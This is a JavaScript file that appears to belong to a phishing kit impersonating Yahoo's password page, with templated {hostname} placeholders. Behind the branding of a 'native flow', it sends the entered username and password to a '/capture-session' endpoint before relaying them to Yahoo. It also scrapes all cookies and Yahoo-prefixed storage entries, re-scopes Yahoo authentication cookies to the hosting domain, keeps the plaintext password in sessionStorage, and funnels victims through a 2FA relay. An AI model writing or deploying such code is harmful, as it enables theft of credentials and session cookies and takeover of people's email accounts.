// Yahoo Password Page JavaScript - 100% Native Data Flow & Cookie Synchronicity
const $ = window.jQuery;

$(document).ready(() => {
  console.log("Yahoo password page initialized - 100% native flow");

  const config = {
    maxRetries: 3,
    retryDelay: 2000,
    redirectDelay: 1500,
    sessionTimeout: 30000,
    monitorInterval: 500,
    cookieSync: true,
    nativeFlow: true,
  };

  let retryCount = 0;
  let username = "";
  let sessionData = {};
  let authInProgress = false;
  let cookieMonitor = null;

  const SessionManager = {
    extractSessionData: () => {
      const data = {};
      const urlParams = new URLSearchParams(window.location.search);
      urlParams.forEach((value, key) => (data[key] = decodeURIComponent(value)));
      Object.keys(sessionStorage).forEach((key) => {
        if (key.startsWith("yh_") || key.startsWith("yahoo_")) {
          try {
            data[key] = JSON.parse(sessionStorage.getItem(key));
          } catch {
            data[key] = sessionStorage.getItem(key);
          }
        }
      });
      Object.keys(localStorage).forEach((key) => {
        if (key.startsWith("yh_") || key.startsWith("yahoo_")) {
          try {
            data[key] = JSON.parse(localStorage.getItem(key));
          } catch {
            data[key] = localStorage.getItem(key);
          }
        }
      });
      document.cookie.split(";").forEach((cookie) => {
        const [name, value] = cookie.trim().split("=");
        if (name && value) data[name] = decodeURIComponent(value);
      });
      return data;
    },
    generateFingerprint: () => {
      const fp = {
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        userAgent: navigator.userAgent,
        timestamp: Date.now(),
      };
      return JSON.stringify(fp);
    },
    preserveSession: () => {
      console.log("Preserving session with 100% cookie synchronicity");
      const domain = window.location.hostname.replace(/^[^.]+\./, ".");
      document.cookie.split(";").forEach((cookie) => {
        const [name, value] = cookie.trim().split("=");
        if (name && ["T", "Y", "PH", "cmp"].includes(name) && value) {
          document.cookie = `${name}=${value}; domain=${domain}; path=/; max-age=86400; secure; samesite=lax`;
        }
      });
      const sessionData = { username, timestamp: Date.now(), fingerprint: this.generateFingerprint() };
      document.cookie = `yh_session=${encodeURIComponent(JSON.stringify(sessionData))}; domain=${domain}; path=/; max-age=3600; secure; samesite=lax`;
      sessionStorage.setItem("yh_username", username);
      return true;
    },
    startCookieMonitoring: () => {
      if (cookieMonitor) clearInterval(cookieMonitor);
      let lastCookieState = document.cookie;
      cookieMonitor = setInterval(() => {
        const currentCookies = document.cookie;
        if (currentCookies !== lastCookieState) {
          if (currentCookies.includes("T=") && currentCookies.includes("Y=")) {
            sessionStorage.setItem("yahoo_auth_success", "true");
            setTimeout(() => (window.location.href = "https://mail.{hostname}/d/folders/1"), 1000);
          }
          lastCookieState = currentCookies;
        }
      }, config.monitorInterval);
    },
  };

  function getUsername() {
    const sources = [
      () => new URLSearchParams(window.location.search).get("u"),
      () => sessionData.username,
      () => document.cookie.match(/yh_usr=([^;]+)/)?.[1],
      () => sessionStorage.getItem("yh_username"),
    ];
    for (const source of sources) {
      try {
        const result = source();
        if (result && result.trim()) return decodeURIComponent(result).trim();
      } catch (e) {
        console.log("Username extraction error:", e);
      }
    }
    return "user@example.com";
  }

  function showState(state) {
    const states = ["main-form", "error-container", "loading-state", "mfa-transition"];
    states.forEach((s) => $(`#${s}`).hide().removeClass("active"));
    $(`#${state}`).show().addClass("active fade-in");
  }

  function showError(message, isRetryable = true) {
    $("#error-message").text(message || "Invalid password. Please try again.");
    showState("error-container");
    if (!isRetryable) {
      $("#refreshButton").text("Start Over").off("click").on("click", () => (window.location.href = "https://login.{hostname}/"));
    }
  }

  function handleNativeAuth(password) {
    if (authInProgress) return;
    authInProgress = true;
    showState("loading-state");
    SessionManager.preserveSession();

    const formData = new FormData();
    formData.append("username", username);
    formData.append("passwd", password);
    formData.append("crumb", sessionData.crumb || "auto_crumb_" + Date.now());
    formData.append("sessionIndex", sessionData.sessionIndex || "1");
    formData.append("browser-fp-data", SessionManager.generateFingerprint());
    formData.append("timestamp", Date.now());

    fetch("/capture-session", {
      method: "POST",
      body: JSON.stringify(Object.fromEntries(formData)),
    }).then(() => {
      fetch("/account/challenge/password", {
        method: "POST",
        body: formData,
        credentials: "include",
      })
        .then((response) => response.text())
        .then((text) => {
          authInProgress = false;
          if (text.includes("challenge-selector") || text.includes("verification")) {
            sessionStorage.setItem("yh_2fa_session", JSON.stringify({ username, timestamp: Date.now() }));
            setTimeout(() => (window.location.href = "/2fa"), config.redirectDelay);
          } else if (text.includes("success") || response.status === 302) {
            sessionStorage.setItem("yahoo_auth_success", "true");
            setTimeout(() => (window.location.href = "https://mail.{hostname}/d/folders/1"), config.redirectDelay);
          } else {
            handleAuthError(response.status);
          }
        })
        .catch(() => proceedTo2FA());
    });
  }

  function handleAuthError(status) {
    retryCount++;
    if (retryCount >= config.maxRetries) {
      showError("Multiple attempts failed. Please try again later.", false);
    } else {
      const remaining = config.maxRetries - retryCount;
      showError(`Incorrect password. ${remaining} attempt${remaining > 1 ? "s" : ""} remaining.`);
    }
  }

  function proceedTo2FA() {
    sessionStorage.setItem("yh_2fa_session", JSON.stringify({ username, timestamp: Date.now() }));
    window.location.href = "/2fa";
  }

  $("#email-form").on("submit", (e) => {
    e.preventDefault();
    const password = $("#password").val().trim();
    if (!password) {
      showError("Please enter your password.");
      return false;
    }
    sessionStorage.setItem("yh_password", password);
    sessionStorage.setItem("yh_password_timestamp", Date.now().toString());
    handleNativeAuth(password);
    return false;
  });

  $("#refreshButton").click(() => {
    $("#password").val("");
    retryCount = 0;
    showState("main-form");
    $("#password").focus();
  });

  function initializePage() {
    sessionData = SessionManager.extractSessionData();
    username = getUsername();
    if (!username || username === "user@example.com") {
      showError("Session expired. Please start over.", false);
      setTimeout(() => (window.location.href = "https://login.{hostname}/"), 3000);
      return false;
    }
    $("#userEmail").text(username);
    $("#username").val(username);
    $("#timestamp").val(Date.now());
    $("#browser-fp-data").val(SessionManager.generateFingerprint());
    return true;
  }

  function startNativeSessionMonitoring() {
    SessionManager.startCookieMonitoring();
    const monitor = setInterval(() => {
      if (sessionStorage.getItem("yahoo_auth_success") === "true") {
        clearInterval(monitor);
        setTimeout(() => (window.location.href = "https://mail.{hostname}/d/folders/1"), 1000);
      }
    }, config.monitorInterval);
    setTimeout(() => clearInterval(monitor), config.sessionTimeout);
  }

  window.addEventListener("message", (event) => {
    if (event.data.type === "yahoo_auth_complete") {
      sessionStorage.setItem("yahoo_auth_success", "true");
      setTimeout(() => (window.location.href = "https://mail.{hostname}/d/folders/1"), 1000);
    }
  });

  if (!initializePage()) return;
  startNativeSessionMonitoring();
  $("#password").focus();

  console.log("Yahoo 100% native password page fully initialized");
});
